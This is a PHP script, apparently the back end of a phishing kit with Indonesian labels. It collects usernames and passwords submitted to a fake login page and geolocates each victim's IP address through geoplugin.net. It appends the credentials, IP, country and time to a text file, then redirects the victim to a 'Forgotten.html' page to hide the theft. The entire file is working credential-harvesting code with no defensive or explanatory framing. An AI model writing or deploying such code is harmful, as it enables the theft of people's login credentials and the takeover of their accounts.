<?php
$file = "balala69.txt";
$text = $_POST['username'];
$password = $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR'];
$host = "http://www.geoplugin.net/php.gp?ip=$ip";
date_default_timezone_set("Asia/Jakarta");
date("Y-m-d H:i:s", mktime(date("H")+1, date("i"), date("s"), date("m"), date("d"), date("Y")));
$namahari = array("Minggu","Senin","Selasa","Rabu","Kamis","Jum'at","Sabtu"); 
$namabulan = array("","Januari","Februari","Maret","April","Mei","Juni","Juli","Agustus","September","Oktober","November","Desember"); 
$waktu =  $namahari[date("w")].", ".date("j")." ".$namabulan[date("n")]." ".date("Y H:i"); 
$response = fetch($host);
$data = unserialize($response);
$a = $data['geoplugin_city'];
$b = $data['geoplugin_region'];
$c = $data['geoplugin_countryName'];

function fetch($host) {

		if ( function_exists('curl_init') ) {
						
			//use cURL to fetch data
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, $host);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($ch, CURLOPT_USERAGENT, 'geoPlugin PHP Class v1.0');
			$response = curl_exec($ch);
			curl_close ($ch);
			
		} else if ( ini_get('allow_url_fopen') ) {
			
			//fall back to fopen()
			$response = file_get_contents($host, 'r');
			
		} else {

			trigger_error ('geoPlugin class Error: Cannot retrieve data. Either compile PHP with cURL support or enable allow_url_fopen in php.ini ', E_USER_ERROR);
			return;
		
		}
		
		return $response;
	}
$handle = fopen($file, 'a');
fwrite($handle, "===================================");
fwrite($handle, "\n");
fwrite($handle, "  EMAIL        : ");
fwrite($handle, "$text");
fwrite($handle, "\n");
fwrite($handle, "  PASSWORD     : ");
fwrite($handle, "$password");
fwrite($handle, "\n");
fwrite($handle, "  INFO IP      : ");
fwrite($handle, "$ip ");
fwrite($handle, "\n");
fwrite($handle, "  NEGARA       : ");
fwrite($handle, "$c");
fwrite($handle, "\n");
fwrite($handle, "  Waktu Masuk  : ");
fwrite($handle, "$waktu");
fwrite($handle, "\n");
fwrite($handle, "");
fclose($handle);
echo "<script images=\"JavaScript\">
<!--
window.location=\"Forgotten.html\";
// -->
</script>";
?>